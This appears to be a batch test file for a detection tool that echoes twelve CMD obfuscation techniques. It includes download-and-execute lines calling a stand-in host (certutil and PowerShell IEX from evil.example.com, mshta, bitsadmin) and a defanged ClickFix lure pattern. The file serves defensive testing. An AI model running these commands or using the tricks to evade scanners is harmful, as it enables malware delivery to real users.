@echo off
REM === Loupe Test File: CMD Obfuscation Examples ===
REM This file contains various CMD obfuscation techniques for testing detection.
REM WARNING: This is a HARMLESS test file. No actual malicious actions are performed.

REM ── Technique 1: Caret Insertion ──
REM Carets break up keywords so AV/static scanners miss them
echo [TEST] Caret obfuscation:
echo p^o^w^e^r^s^h^e^l^l -c "Write-Host 'Hello from caret test'"
echo c^e^r^t^u^t^i^l -decode test.b64 test.exe
echo m^s^h^t^a http://example.com/test.hta
echo b^i^t^s^a^d^m^i^n /transfer testjob http://example.com/file.exe C:\temp\file.exe

REM ── Technique 2: SET Variable Concatenation ──
REM Build commands from small variable fragments
echo [TEST] SET variable concatenation:
set a=pow
set b=ers
set c=hel
set d=l
set e=-c
set f=Write
set g=-Host
set h='test'
echo %a%%b%%c%%d% %e% "%f%%g% %h%"

REM ── Technique 3: CALL with variable expansion ──
echo [TEST] CALL with concatenated variables:
set x1=po
set x2=wer
set x3=she
set x4=ll
call echo %x1%%x2%%x3%%x4%

REM ── Technique 4: Environment Variable Substring Abuse ──
REM Extract individual characters from known env vars to build commands
echo [TEST] Environment variable substring abuse:
REM %COMSPEC% is typically C:\Windows\system32\cmd.exe
REM Extract characters: %COMSPEC:~0,1% = C, etc.
echo %COMSPEC:~0,1%%COMSPEC:~1,1%%COMSPEC:~2,1%
echo %PATH:~0,1%%PATH:~1,1%%PATH:~2,1%%PATH:~3,1%%PATH:~4,1%

REM ── Technique 5: Mixed Obfuscation ──
echo [TEST] Mixed techniques:
set aa=cer
set bb=tut
set cc=il
echo %aa%%bb%%cc% -urlcache -split -f http://evil.example.com/payload.exe C:\temp\payload.exe

REM ── Technique 6: FOR loop character extraction ──
echo [TEST] FOR loop obfuscation:
set "payload=powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/script.ps1')"
echo %payload%

REM ── Technique 7: Inline single-token env-var substring ──
REM A single %VAR:~start,length% inside a sensitive keyword like
REM Powe…Shell.exe — this defeats finders that require ≥2 substrings.
echo [TEST] Inline single-token substring:
echo cmd.exe /c "Powe%ALLUSERSPROFILE:~4,1%Shell.exe IEX (New-Object Net.WebClient).DownloadString('http://example.com/x')"

REM ── Technique 8: FOR /F set^|findstr trick ──
REM Pull the value of an env var by name match without naming it directly.
echo [TEST] FOR /F set^|findstr:
echo FOR /F "delims=s\ tokens=4" %%a IN ('set^^^|findstr PSM') DO %%a

REM ── Technique 9: %COMSPEC% in argv0 position ──
REM Bare %COMSPEC% replaces "cmd.exe" entirely; resolver must recognise
REM that the first token of the line is itself an env-var reference.
echo [TEST] COMSPEC argv0:
echo %%COMSPEC%% /b /c start /b /min netstat -ano ^| findstr LISTENING

REM ── Technique 10: Same-line set + call ──
REM `set com=…&&call %com%` — variable defined and consumed in one line.
echo [TEST] Same-line set+call:
echo cmd /c "set com=netstat /ano&&call %%com%%"

REM ── Technique 11: Carets inside %VAR% + indirect-name set + delayed-expansion ──
REM The big wmic-style blob. Combines:
REM   * carets inside %Co^m^S^p^Ec^% (cmd strips them before expansion)
REM   * indirect-name set: `set %X%=val` defines variable named *value of X*
REM   * delayed-expansion indirection: !%X%! reads the var named by %X%
echo [TEST] wmic-style multi-trick blob:
echo %%Co^^m^^S^^p^^Ec^^%% /v:on /c "set X=A&& set Y=B&& set Z=C&& set %%X%%=net&& set %%Y%%=stat&& set %%Z%%=-ano&& !%%X%%!!%%Y%%! !%%Z%%!"

REM ── Technique 12: ClickFix `for /f` + double-caret + finger LOLBin ──
REM A canonical Win+R ClickFix payload: %COMSPEC% argv0, for /f
REM indirect execution, double-caret (`^^`) caret-obfuscation surviving
REM the nested-quote parse, `do call %A` execute-the-output, and a
REM trailing `Verify you are human` echo with off-screen-scroll
REM whitespace. The actual `finger` invocation has been replaced with
REM a harmless `echo HARMLESS-CLICKFIX-CORPUS` so this file remains
REM safe to render.
echo [TEST] ClickFix for /f + double-caret + LOLBin:
echo %%COMSPEC%% /c start "" /min for /f "delims=" %%A in ('e^^ch^^o HARMLESS-CLICKFIX-CORPUS') do call %%A ^& exit ^&^& echo 'Verify you are human     '

echo.
echo [DONE] All CMD obfuscation test patterns rendered.
pause
